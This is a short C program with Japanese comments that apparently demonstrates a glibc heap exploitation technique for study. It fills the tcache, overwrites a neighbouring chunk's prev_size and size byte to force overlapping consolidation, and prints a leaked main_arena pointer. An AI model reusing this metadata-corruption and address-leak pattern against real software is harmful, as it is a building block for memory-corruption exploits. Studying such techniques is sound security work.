#include<stdio.h>
#include<stdlib.h>

int main(){
    char *p[20] = {};

    for(int i=0; i<7; i++) p[i] = (char *)malloc(0x88);
    for(int i=0; i<7; i++) p[i+7] = (char *)malloc(0xf8);

    char *a = (char *)malloc(0x88);
    char *b = (char *)malloc(0x18);
    char *c = (char *)malloc(0xf8);
    p[14] = (char *)malloc(0x18);

    for(int i=0; i<14; i++) free(p[i]);     // tcacheを埋める

    free(a);    // unsorted binに格納される

    *(unsigned long *)(b+0x10) = 0xb0;      // cのprev_size
    *(char *)(b+0x18) = 0;  // cのsizeの下位1バイト

    free(c);    

    for(int i=0; i<7; i++) p[i] = (char *)malloc(0x88);     // tcacheから確保
    p[8] = (char *)malloc(0x88);
    printf("main_arena: %p\n", *(void **)b-0x60);
}